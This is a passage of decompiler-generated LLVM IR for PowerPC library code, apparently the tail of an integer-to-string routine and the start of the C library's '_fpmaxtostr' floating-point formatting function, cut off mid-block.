dec_label_pc_100116b0:                            ; preds = %dec_label_pc_100116b0thread-pre-split, %dec_label_pc_100116ac
  %v1_100116f8 = phi i32 [ %v1_100116b4.pre, %dec_label_pc_100116b0thread-pre-split ], [ %v1_10011694, %dec_label_pc_100116ac ]
  %v1_100116c8 = phi i32 [ %v0_100116b0.pr, %dec_label_pc_100116b0thread-pre-split ], [ %v0_100116ac, %dec_label_pc_100116ac ]
  %v3_100116b0 = icmp eq i32 %v1_100116c8, 0
  %v0_100116b4 = load i32, i32* %r6.global-to-local, align 4
  %v2_100116b4 = udiv i32 %v0_100116b4, %v1_100116f8
  br i1 %v3_100116b0, label %dec_label_pc_100116f8, label %dec_label_pc_100116bc

dec_label_pc_100116bc:                            ; preds = %dec_label_pc_100116b0
  %v2_100116bc = udiv i32 %v1_100116c8, %v1_100116f8
  %v2_100116c0 = mul i32 %v2_100116bc, %v1_100116f8
  %v2_100116c4 = mul i32 %v2_100116b4, %v1_100116f8
  %v2_100116c8 = sub i32 %v1_100116c8, %v2_100116c0
  store i32 %v2_100116bc, i32* %r12.global-to-local, align 4
  %v0_100116d0 = load i32, i32* @r31, align 4
  %v2_100116d0 = mul i32 %v0_100116d0, %v2_100116c8
  %v2_100116d4 = sub i32 %v0_100116b4, %v2_100116c4
  %v2_100116d8 = add i32 %v2_100116d0, %v2_100116d4
  %v0_100116dc = load i32, i32* @r8, align 4
  %v2_100116dc = mul i32 %v0_100116dc, %v2_100116c8
  %v2_100116e0 = udiv i32 %v2_100116d8, %v1_100116f8
  %v2_100116e4 = add i32 %v2_100116dc, %v2_100116b4
  %v2_100116e8 = mul i32 %v2_100116e0, %v1_100116f8
  %v2_100116ec = add i32 %v2_100116e4, %v2_100116e0
  store i32 %v2_100116ec, i32* %r6.global-to-local, align 4
  %v2_100116f0 = sub i32 %v2_100116d8, %v2_100116e8
  store i32 %v2_100116f0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10011704

dec_label_pc_100116f8:                            ; preds = %dec_label_pc_100116b0
  %v2_100116f8 = mul i32 %v2_100116b4, %v1_100116f8
  %v2_100116fc = sub i32 %v0_100116b4, %v2_100116f8
  store i32 %v2_100116fc, i32* %r5.global-to-local, align 4
  store i32 %v2_100116b4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10011704

dec_label_pc_10011704:                            ; preds = %dec_label_pc_100116bc, %dec_label_pc_100116f8
  %v1_10011708 = phi i32 [ %v2_100116bc, %dec_label_pc_100116bc ], [ 0, %dec_label_pc_100116f8 ]
  %v0_10011708 = phi i32 [ %v2_100116ec, %dec_label_pc_100116bc ], [ %v2_100116b4, %dec_label_pc_100116f8 ]
  %v0_1001170c = phi i32 [ %v2_100116f0, %dec_label_pc_100116bc ], [ %v2_100116fc, %dec_label_pc_100116f8 ]
  %v2_10011708 = or i32 %v0_10011708, %v1_10011708
  %v5_10011708 = icmp eq i32 %v2_10011708, 0
  store i1 %v5_10011708, i1* %cr0_eq.global-to-local, align 1
  %v1_10011710 = load i32, i32* @r30, align 4
  %v0_10011714 = load i32, i32* %r3.global-to-local, align 4
  %v1_10011714 = add i32 %v0_10011714, -1
  store i32 %v1_10011714, i32* %r3.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_1001170c, 10
  %v1_1001170c.v2_10011710.v = select i1 %tmp14, i32 48, i32 %v1_10011710
  %v1_1001170c.v2_10011710 = add i32 %v0_1001170c, %v1_1001170c.v2_10011710.v
  %extract.t9.extract.t = trunc i32 %v1_1001170c.v2_10011710 to i8
  %v3_10011724 = inttoptr i32 %v1_10011714 to i8*
  store i8 %extract.t9.extract.t, i8* %v3_10011724, align 1
  %v0_10011728 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10011728, label %dec_label_pc_1001172c, label %dec_label_pc_100116b0thread-pre-split

dec_label_pc_1001172c:                            ; preds = %dec_label_pc_10011704
  %v0_1001172c = load i32, i32* @r29, align 4
  %v3_1001172c = icmp eq i32 %v0_1001172c, 0
  br i1 %v3_1001172c, label %dec_label_pc_1001172c.dec_label_pc_1001173c_crit_edge, label %dec_label_pc_10011734

dec_label_pc_1001172c.dec_label_pc_1001173c_crit_edge: ; preds = %dec_label_pc_1001172c
  %v0_10011744.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001173c

dec_label_pc_10011734:                            ; preds = %dec_label_pc_1001172c
  %v2_10011738 = load i32, i32* %r3.global-to-local, align 4
  %v3_10011738 = add i32 %v2_10011738, -1
  %v4_10011738 = inttoptr i32 %v3_10011738 to i8*
  store i8 45, i8* %v4_10011738, align 1
  store i32 %v3_10011738, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001173c

dec_label_pc_1001173c:                            ; preds = %dec_label_pc_1001172c.dec_label_pc_1001173c_crit_edge, %dec_label_pc_10011734
  %v0_10011744 = phi i32 [ %v0_10011744.pre, %dec_label_pc_1001172c.dec_label_pc_1001173c_crit_edge ], [ %v3_10011738, %dec_label_pc_10011734 ]
  ret i32 %v0_10011744

; uselistorder directives
  uselistorder i32 %v2_100116bc, { 1, 2, 0 }
  uselistorder i32 %v2_100116b4, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_100116f8, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_10011694, { 1, 2, 0 }
  uselistorder i32 %v0_10011694, { 1, 0 }
  uselistorder i32 %v0_10011650, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1001173c, { 1, 0 }
  uselistorder label %dec_label_pc_10011704, { 1, 0 }
  uselistorder label %dec_label_pc_100116ac, { 1, 0 }
  uselistorder label %dec_label_pc_10011684, { 2, 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_10011748 = load i32, i32* @lr, align 4
  store i32 %v0_10011748, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_10011764 = add i32 %tmp, 11
  %v2_10011764 = inttoptr i32 %v1_10011764 to i8*
  %v3_10011764 = load i8, i8* %v2_10011764, align 1
  %v4_10011764 = zext i8 %v3_10011764 to i32
  store i32 %v4_10011764, i32* %r31.global-to-local, align 4
  %v1_10011768 = or i32 %v4_10011764, 32
  %v1_1001176c = icmp ult i32 %v1_10011768, 97
  %v3_1001176c = icmp eq i32 %v1_10011768, 97
  store i1 %v1_1001176c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001176c, i1* %cr7_eq.global-to-local, align 1
  store i32 101, i32* %r0.global-to-local, align 4
  %v1_10011778 = add i32 %tmp, 4
  %v2_10011778 = inttoptr i32 %v1_10011778 to i32*
  %v3_10011778 = load i32, i32* %v2_10011778, align 4
  store i32 %v3_10011778, i32* %r28.global-to-local, align 4
  %v2_1001177c = load i32, i32* %arg2, align 4
  store i32 %v2_1001177c, i32* %r30.global-to-local, align 4
  br i1 %v3_1001176c, label %dec_label_pc_10011784, label %dec_label_pc_1001178c

dec_label_pc_10011784:                            ; preds = %entry
  %v1_10011784 = add nuw nsw i32 %v4_10011764, 6
  store i32 %v1_10011784, i32* %r0.global-to-local, align 4
  %v1_10011788 = urem i32 %v1_10011784, 256
  store i32 %v1_10011788, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001178c

dec_label_pc_1001178c:                            ; preds = %entry, %dec_label_pc_10011784
  %v0_10011840 = phi i32 [ %v4_10011764, %entry ], [ %v1_10011788, %dec_label_pc_10011784 ]
  %v1_1001178c = icmp slt i32 %v2_1001177c, 0
  %v3_1001178c = icmp eq i32 %v2_1001177c, 0
  store i1 %v1_1001178c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001178c, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_1001177c, -1
  br i1 %tmp75, label %dec_label_pc_10011798, label %dec_label_pc_10011794

dec_label_pc_10011794:                            ; preds = %dec_label_pc_1001178c
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10011798

dec_label_pc_10011798:                            ; preds = %dec_label_pc_1001178c, %dec_label_pc_10011794
  %v0_1001195044 = phi i32 [ %v2_1001177c, %dec_label_pc_1001178c ], [ 6, %dec_label_pc_10011794 ]
  %v1_10011798 = add i32 %tmp, 12
  %v2_10011798 = inttoptr i32 %v1_10011798 to i32*
  %v3_10011798 = load i32, i32* %v2_10011798, align 4
  store i32 %v3_10011798, i32* %r9.global-to-local, align 4
  %v1_1001179c = and i32 %v3_10011798, 2
  %v3_1001179c = icmp eq i32 %v1_1001179c, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  br i1 %v3_1001179c, label %dec_label_pc_100117b4, label %dec_label_pc_100117c0

dec_label_pc_100117b4:                            ; preds = %dec_label_pc_10011798
  %v1_100117b4 = urem i32 %v3_10011798, 2
  store i32 %v1_100117b4, i32* @r7, align 4
  %v3_100117b4 = icmp eq i32 %v1_100117b4, 0
  br i1 %v3_100117b4, label %dec_label_pc_100117c4, label %dec_label_pc_100117c0

dec_label_pc_100117c0:                            ; preds = %dec_label_pc_100117b4, %dec_label_pc_10011798
  %storemerge = phi i32 [ 43, %dec_label_pc_10011798 ], [ 32, %dec_label_pc_100117b4 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_100117c0 = trunc i32 %storemerge to i8
  store i8 %v6_100117c0, i8* %stack_var_-200, align 1
  br label %dec_label_pc_100117c4

dec_label_pc_100117c4:                            ; preds = %dec_label_pc_100117b4, %dec_label_pc_100117c0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1001178c, label %dec_label_pc_10011928, label %dec_label_pc_10011840

dec_label_pc_10011840:                            ; preds = %dec_label_pc_100117c4
  %v1_10011840 = icmp ult i32 %v0_10011840, 96
  %v2_10011840 = icmp ugt i32 %v0_10011840, 96
  %v3_10011840 = icmp eq i32 %v0_10011840, 96
  store i1 %v1_10011840, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011840, i1* %cr7_eq.global-to-local, align 1
  %v2_10011848 = add i32 %tmp, 16
  %v3_10011848 = inttoptr i32 %v2_10011848 to i32*
  store i32 32, i32* %v3_10011848, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_10011840, label %dec_label_pc_1001186c, label %dec_label_pc_10011860

dec_label_pc_10011860:                            ; preds = %dec_label_pc_10011840
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001186c

dec_label_pc_1001186c:                            ; preds = %dec_label_pc_10011840, %dec_label_pc_10011860
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_10017ae0.672 to i32), i32 8), %dec_label_pc_10011840 ], [ add (i32 ptrtoint ([4 x i8]* @global_var_10017ae0.672 to i32), i32 12), %dec_label_pc_10011860 ]
  store i32 ptrtoint ([4 x i8]* @global_var_10017ae0.672 to i32), i32* %r9.global-to-local, align 4
  %v2_10011878 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10011878, i32* @r8, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10011d18

dec_label_pc_10011928:                            ; preds = %dec_label_pc_100117c4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1001192c = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_1001192c, i32* %r6.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_10011978 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_1001194c

dec_label_pc_1001194c:                            ; preds = %dec_label_pc_100119cc.dec_label_pc_1001194c_crit_edge, %dec_label_pc_10011928
  %v0_10011950 = phi i32 [ %v0_10011950.pre, %dec_label_pc_100119cc.dec_label_pc_1001194c_crit_edge ], [ %v0_1001195044, %dec_label_pc_10011928 ]
  %v3_10011950 = call %1 @__asm_cror(i32 %v0_10011950, i32 %tmp, i32 %v0_10011950)
  %v11_10011950 = extractvalue %1 %v3_10011950, 7
  store i4 %v11_10011950, i4* @cr4, align 1
  %v0_10011954 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10011954, label %dec_label_pc_10011968, label %dec_label_pc_1001197c

dec_label_pc_10011968:                            ; preds = %dec_label_pc_1001194c
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001197c

dec_label_pc_1001197c:                            ; preds = %dec_label_pc_1001194c, %dec_label_pc_10011968
  %storemerge2 = phi i32 [ %v1_10011978, %dec_label_pc_10011968 ], [ %tmp55, %dec_label_pc_1001194c ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_1001198c = load i32, i32* %r6.global-to-local, align 4
  %v1_1001198c = add i32 %v0_1001198c, 9
  store i32 %v1_1001198c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100119a8

dec_label_pc_100119a8:                            ; preds = %dec_label_pc_100119a8.dec_label_pc_100119a8_crit_edge, %dec_label_pc_1001197c
  %v1_100119b0 = phi i32 [ %v1_100119b0.pre, %dec_label_pc_100119a8.dec_label_pc_100119a8_crit_edge ], [ %v1_1001198c, %dec_label_pc_1001197c ]
  %v0_100119ac = phi i32 [ %v0_100119ac.pre, %dec_label_pc_100119a8.dec_label_pc_100119a8_crit_edge ], [ 0, %dec_label_pc_1001197c ]
  %v1_100119a8 = phi i32 [ %v1_100119a8.pre, %dec_label_pc_100119a8.dec_label_pc_100119a8_crit_edge ], [ 10, %dec_label_pc_1001197c ]
  %v1_100119b8 = phi i32 [ %v0_100119a8.pre, %dec_label_pc_100119a8.dec_label_pc_100119a8_crit_edge ], [ %storemerge2, %dec_label_pc_1001197c ]
  %v2_100119a8 = udiv i32 %v1_100119b8, %v1_100119a8
  store i32 %v2_100119a8, i32* %r0.global-to-local, align 4
  %v1_100119ac = add i32 %v0_100119ac, 1
  store i32 %v1_100119ac, i32* %r8.global-to-local, align 4
  %v2_100119b0 = sub i32 %v1_100119b0, %v1_100119ac
  store i32 %v2_100119b0, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_100119a8, -10
  store i32 %v2_100119a8, i32* %r10.global-to-local, align 4
  %v2_100119b8 = add i32 %v1_100119b8, 48
  %v1_100119c0 = add i32 %v2_100119b8, %tmp76
  store i32 %v1_100119c0, i32* %r9.global-to-local, align 4
  %v1_100119c4 = trunc i32 %v1_100119c0 to i8
  %v3_100119c4 = inttoptr i32 %v2_100119b0 to i8*
  store i8 %v1_100119c4, i8* %v3_100119c4, align 1
  %v0_100119c8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100119c8 = add i32 %v0_100119c8, -1
  store i32 %v1_100119c8, i32* %ctr.global-to-local, align 4
  %v2_100119c8 = icmp eq i32 %v1_100119c8, 0
  br i1 %v2_100119c8, label %dec_label_pc_100119cc, label %dec_label_pc_100119a8.dec_label_pc_100119a8_crit_edge

dec_label_pc_100119a8.dec_label_pc_100119a8_crit_edge: ; preds = %dec_label_pc_100119a8
  %v0_100119a8.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_100119a8.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_100119ac.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_100119b0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_100119a8

dec_label_pc_100119cc:                            ; preds = %dec_label_pc_100119a8
  %v0_100119cc = load i32, i32* %r7.global-to-local, align 4
  %v1_100119cc = icmp slt i32 %v0_100119cc, 0
  %v3_100119cc = icmp eq i32 %v0_100119cc, 0
  store i1 %v1_100119cc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100119cc, i1* %cr7_eq.global-to-local, align 1
  %v1_100119d0 = add i32 %v0_100119cc, 1
  store i32 %v1_100119d0, i32* %r7.global-to-local, align 4
  br i1 %v3_100119cc, label %dec_label_pc_100119cc.dec_label_pc_1001194c_crit_edge, label %dec_label_pc_100119d8

dec_label_pc_100119cc.dec_label_pc_1001194c_crit_edge: ; preds = %dec_label_pc_100119cc
  %v0_10011950.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001194c

dec_label_pc_100119d8:                            ; preds = %dec_label_pc_100119cc
  %v0_100119d8 = load i32, i32* %r31.global-to-local, align 4
  %v1_100119d8 = icmp ult i32 %v0_100119d8, 96
  %v2_100119d8 = icmp ugt i32 %v0_100119d8, 96
  %v3_100119d8 = icmp eq i32 %v0_100119d8, 96
  store i1 %v1_100119d8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100119d8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100119d8, label %dec_label_pc_100119f0, label %dec_label_pc_100119e0

dec_label_pc_100119e0:                            ; preds = %dec_label_pc_100119d8
  %v1_100119e8 = add i32 %v0_100119d8, 32
  store i32 %v1_100119e8, i32* %r0.global-to-local, align 4
  %v1_100119ec = urem i32 %v1_100119e8, 256
  store i32 %v1_100119ec, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100119f0

dec_label_pc_100119f0:                            ; preds = %dec_label_pc_100119d8, %dec_label_pc_100119e0
  %v0_10011a08 = phi i32 [ %v1_100119ec, %dec_label_pc_100119e0 ], [ %v0_100119d8, %dec_label_pc_100119d8 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_100119e0 ], [ 101, %dec_label_pc_100119d8 ]
  %v1_100119f0 = icmp slt i32 %v0_10011a08, 103
  %v3_100119f0 = icmp eq i32 %v0_10011a08, 103
  store i1 %v1_100119f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100119f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100119f0, label %dec_label_pc_100119f8, label %dec_label_pc_10011a08

dec_label_pc_100119f8:                            ; preds = %dec_label_pc_100119f0
  %v0_100119f8 = load i32, i32* %r30.global-to-local, align 4
  %v1_100119f8 = icmp slt i32 %v0_100119f8, 0
  %v3_100119f8 = icmp eq i32 %v0_100119f8, 0
  store i1 %v1_100119f8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100119f8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100119f8, label %dec_label_pc_10011a10, label %dec_label_pc_10011a00

dec_label_pc_10011a00:                            ; preds = %dec_label_pc_100119f8
  %v1_10011a00 = add i32 %v0_100119f8, -1
  store i32 %v1_10011a00, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10011a10

dec_label_pc_10011a08:                            ; preds = %dec_label_pc_100119f0
  %v1_10011a08 = icmp slt i32 %v0_10011a08, 102
  %v3_10011a08 = icmp eq i32 %v0_10011a08, 102
  store i1 %v1_10011a08, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011a08, i1* %cr7_eq.global-to-local, align 1
  %v0_10011a18 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_10011a08, label %dec_label_pc_10011a18, label %dec_label_pc_10011a10

dec_label_pc_10011a10:                            ; preds = %dec_label_pc_10011a08, %dec_label_pc_100119f8, %dec_label_pc_10011a00
  %v0_10011a10 = phi i32 [ 0, %dec_label_pc_100119f8 ], [ %v1_10011a00, %dec_label_pc_10011a00 ], [ %v0_10011a18, %dec_label_pc_10011a08 ]
  store i32 %v0_10011a10, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10011a3c

dec_label_pc_10011a18:                            ; preds = %dec_label_pc_10011a08
  %v1_10011a18 = load i32, i32* %r4.global-to-local, align 4
  %v2_10011a18 = add i32 %v1_10011a18, %v0_10011a18
  store i32 %v2_10011a18, i32* %r10.global-to-local, align 4
  %v1_10011a1c = icmp slt i32 %v2_10011a18, -1
  %v3_10011a1c = icmp eq i32 %v2_10011a18, -1
  store i1 %v1_10011a1c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011a1c, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_10011a18, -2
  br i1 %tmp77, label %dec_label_pc_10011a3c, label %dec_label_pc_10011a24

dec_label_pc_10011a24:                            ; preds = %dec_label_pc_10011a18
  store i32 48, i32* %r4.global-to-local, align 4
  %v2_10011a28 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_10011a28, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 268507700, i32* @lr, align 4
  %v3_10011a30 = call i32 @__GI_memset(i32 %v2_10011a28, i32 48, i32 17)
  store i32 %v3_10011a30, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10011a3c

dec_label_pc_10011a3c:                            ; preds = %dec_label_pc_10011a18, %dec_label_pc_10011a10, %dec_label_pc_10011a24
  %v1_10011a60 = phi i32 [ %v2_10011a18, %dec_label_pc_10011a18 ], [ %v0_10011a10, %dec_label_pc_10011a10 ], [ -1, %dec_label_pc_10011a24 ]
  %v1_10011a3c = icmp slt i32 %v1_10011a60, 16
  %v2_10011a3c = icmp sgt i32 %v1_10011a60, 16
  %v3_10011a3c = icmp eq i32 %v1_10011a60, 16
  store i1 %v1_10011a3c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011a3c, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_10011a50 = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_10011a50, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_10011a3c, label %dec_label_pc_10011a78, label %dec_label_pc_10011a5c

dec_label_pc_10011a5c:                            ; preds = %dec_label_pc_10011a3c
  %v2_10011a5c = ptrtoint i32* %stack_var_-177 to i32
  %v2_10011a60 = add i32 %v1_10011a60, %v2_10011a5c
  store i32 %v2_10011a60, i32* %r9.global-to-local, align 4
  %v1_10011a64 = add i32 %v2_10011a60, 2
  %v2_10011a64 = inttoptr i32 %v1_10011a64 to i8*
  %v3_10011a64 = load i8, i8* %v2_10011a64, align 1
  %v4_10011a64 = zext i8 %v3_10011a64 to i32
  store i32 %v4_10011a64, i32* %r0.global-to-local, align 4
  store i32 %v1_10011a64, i32* %r11.global-to-local, align 4
  %v1_10011a6c = sub nsw i32 52, %v4_10011a64
  %v2_10011a6c = sub nuw nsw i32 -1, %v4_10011a64
  %not.v5_10011a6c = icmp ugt i32 %v1_10011a6c, %v2_10011a6c
  %v1_10011a74 = zext i1 %not.v5_10011a6c to i32
  store i32 %v1_10011a74, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10011a78

dec_label_pc_10011a78:                            ; preds = %dec_label_pc_10011a3c, %dec_label_pc_10011a5c, %dec_label_pc_10011a78.backedge
  %v0_10011a7c = phi i32 [ %v0_10011a7c.pre, %dec_label_pc_10011a78.backedge ], [ 0, %dec_label_pc_10011a3c ], [ %v1_10011a74, %dec_label_pc_10011a5c ]
  %v0_10011a78 = phi i32 [ %v0_10011a78.pre, %dec_label_pc_10011a78.backedge ], [ %v2_10011a50, %dec_label_pc_10011a3c ], [ %v1_10011a64, %dec_label_pc_10011a5c ]
  %v1_10011a78 = add i32 %v0_10011a78, -1
  %v2_10011a78 = inttoptr i32 %v1_10011a78 to i8*
  %v3_10011a78 = load i8, i8* %v2_10011a78, align 1
  %v4_10011a78 = zext i8 %v3_10011a78 to i32
  store i32 %v1_10011a78, i32* %r11.global-to-local, align 4
  %v2_10011a7c = add i32 %v4_10011a78, %v0_10011a7c
  store i32 %v2_10011a7c, i32* %r0.global-to-local, align 4
  %v1_10011a80 = urem i32 %v2_10011a7c, 256
  store i32 %v1_10011a80, i32* %r9.global-to-local, align 4
  %v1_10011a84 = trunc i32 %v2_10011a7c to i8
  store i8 %v1_10011a84, i8* %v2_10011a78, align 1
  %v0_10011a88 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011a88 = icmp slt i32 %v0_10011a88, 48
  %v3_10011a88 = icmp eq i32 %v0_10011a88, 48
  store i1 %v1_10011a88, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011a88, i1* %cr7_eq.global-to-local, align 1
  %v1_10011a8c = icmp ult i32 %v0_10011a88, 57
  %v2_10011a8c = icmp ugt i32 %v0_10011a88, 57
  %v3_10011a8c = icmp eq i32 %v0_10011a88, 57
  store i1 %v1_10011a8c, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10011a8c, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10011a8c, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10011a88, %v2_10011a8c
  br i1 %brmerge, label %dec_label_pc_10011a78.backedge, label %dec_label_pc_10011a98

dec_label_pc_10011a78.backedge:                   ; preds = %dec_label_pc_10011a78
  %v0_10011a78.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10011a7c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10011a78

dec_label_pc_10011a98:                            ; preds = %dec_label_pc_10011a78
  %v2_10011a98 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_10011a98, i32* %r0.global-to-local, align 4
  %v0_10011a9c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10011a9c, i32* @r7, align 4
  %v0_10011aa0 = load i32, i32* %r11.global-to-local, align 4
  %v2_10011aa0 = icmp ult i32 %v0_10011aa0, %v2_10011a98
  %v3_10011aa0 = icmp ugt i32 %v0_10011aa0, %v2_10011a98
  %v4_10011aa0 = icmp eq i32 %v0_10011aa0, %v2_10011a98
  store i1 %v2_10011aa0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10011aa0, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_1001192c, i32* %r8.global-to-local, align 4
  br i1 %v3_10011aa0, label %dec_label_pc_10011ab8, label %dec_label_pc_10011aac

dec_label_pc_10011aac:                            ; preds = %dec_label_pc_10011a98
  store i32 %v2_10011a98, i32* %r8.global-to-local, align 4
  %v1_10011ab0 = add i32 %v0_10011a9c, 1
  store i32 %v1_10011ab0, i32* @r7, align 4
  store i32 %v2_10011a98, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10011ab8

dec_label_pc_10011ab8:                            ; preds = %dec_label_pc_10011a98, %dec_label_pc_10011aac
  %v2_10011ac0 = phi i32 [ %v0_10011aa0, %dec_label_pc_10011a98 ], [ %v2_10011a98, %dec_label_pc_10011aac ]
  %v0_10011ab8 = load i32, i32* %r31.global-to-local, align 4
  %v1_10011ab8 = icmp slt i32 %v0_10011ab8, 103
  %v3_10011ab8 = icmp eq i32 %v0_10011ab8, 103
  store i1 %v1_10011ab8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011ab8, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10011ac0 = add i32 %v2_10011ac0, 1
  %v4_10011ac0 = inttoptr i32 %v3_10011ac0 to i8*
  store i8 0, i8* %v4_10011ac0, align 1
  %v0_10011ac4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011ac4 = add i32 %v0_10011ac4, 1
  store i32 %v1_10011ac4, i32* %r9.global-to-local, align 4
  %v0_10011ac8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10011ac8, label %dec_label_pc_10011acc, label %dec_label_pc_10011af0

dec_label_pc_10011acc:                            ; preds = %dec_label_pc_10011ab8
